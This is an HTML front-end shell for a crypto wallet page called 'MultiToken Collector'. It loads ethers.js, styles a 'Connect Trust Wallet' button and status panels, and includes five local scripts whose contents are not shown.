<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MultiToken Collector</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: #2a2a2a; padding: 30px; border-radius: 15px; max-width: 500px; width: 90%; text-align: center; }
        h1 { margin-bottom: 20px; color: #00d4ff; }
        #connectWalletBtn { background: #00d4ff; color: #000; border: none; padding: 15px 30px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; }
        #connectWalletBtn:disabled { background: #666; cursor: not-allowed; }
        .status-text { margin: 15px 0; font-size: 16px; color: #00d4ff; }
        .step-text { margin: 5px 0; font-size: 14px; color: #ccc; text-align: left; }
        .error { color: #ff4444; margin: 10px 0; }
        .wallet-info { margin: 15px 0; padding: 15px; background: #333; border-radius: 10px; }
        .final-result h2 { color: #00ff88; margin-bottom: 15px; }
        .download-links a { display: block; color: #00d4ff; margin: 10px 0; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>MultiToken Collector</h1>
        <button id="connectWalletBtn">Connect Trust Wallet</button>
        <div id="status" class="status-text"></div>
        <div id="steps"></div>
        <div id="error" class="error"></div>
        <div id="walletInfo" class="wallet-info" style="display:none;"></div>
    </div>

    <script src="config.js"></script>
    <script src="apiService.js"></script>
    <script src="wallet.js"></script>
    <script src="tokenService.js"></script>
    <script src="app.js"></script>
</body>
</html>
